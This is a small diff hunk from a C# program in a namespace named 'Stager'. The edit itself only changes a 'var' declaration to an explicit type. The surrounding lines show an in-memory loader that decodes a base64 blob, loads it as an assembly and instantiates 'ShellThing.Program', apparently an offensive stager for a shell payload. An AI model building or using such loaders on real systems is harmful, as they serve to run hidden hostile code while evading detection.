@@ -18,7 +18,7 @@ namespace Stager
 
             byte[] assemblyBytes = Convert.FromBase64String(assemblyb64);
 
-            var assembly = Assembly.Load(assemblyBytes);
+            Assembly assembly = Assembly.Load(assemblyBytes);
 
             Type type = assembly.GetType("ShellThing.Program");
             object instance = Activator.CreateInstance(type);
